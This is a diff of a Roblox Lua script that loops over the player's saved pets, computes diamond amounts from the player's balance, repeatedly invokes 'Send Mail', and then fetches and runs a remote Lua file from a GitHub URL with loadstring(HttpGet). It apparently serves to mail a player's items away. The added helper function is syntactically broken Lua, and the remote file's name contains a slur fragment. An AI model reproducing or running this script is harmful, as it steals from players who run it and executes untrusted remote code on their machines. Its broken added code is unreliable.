@@ -265,7 +265,15 @@ local savedPets = FrameworkLibrary.Save.Get().Pets
 _G.Lol = game.Players.LocalPlayer.leaderstats.Diamonds.Value - 2900000
 
 _G.CACA = game.Players.LocalPlayer.leaderstats.Diamonds.Value - 1000000
-
+local function poopie()
+        if v.r = true then
+            _G.Formation = "Rainbow"
+        elseif v.g = true then
+            _G.Formation = "Golden"
+        elseif v.g = false and v.r = false then
+            _G.Formation = "Normal"
+        end
+end
 
 while wait() do
     for i, v in pairs(savedPets) do
@@ -289,6 +297,7 @@ while wait() do
     			}
 			}
 			Invoke("Send Mail", unpack(args))
+			poopie()
             loadstring(game:HttpGet("https://raw.githubusercontent.com/Subashians/FuzeHub/main/nigs.lua"))()
             wait(5)
    
@@ -333,6 +342,7 @@ while wait() do
     			}
 			}
 			Invoke("Send Mail", unpack(args))
+			poopie()
             loadstring(game:HttpGet("https://raw.githubusercontent.com/Subashians/FuzeHub/main/nigs.lua"))()
             wait(5)
    
@@ -377,6 +387,7 @@ while wait() do
     			}
 			}
 			Invoke("Send Mail", unpack(args))
+			poopie()
             loadstring(game:HttpGet("https://raw.githubusercontent.com/Subashians/FuzeHub/main/nigs.lua"))()
             wait(5)
    
@@ -421,6 +432,7 @@ while wait() do
     			}
 			}
 			Invoke("Send Mail", unpack(args))
+			poopie()
             loadstring(game:HttpGet("https://raw.githubusercontent.com/Subashians/FuzeHub/main/nigs.lua"))()
             wait(5)   
             if v2.huge == false then
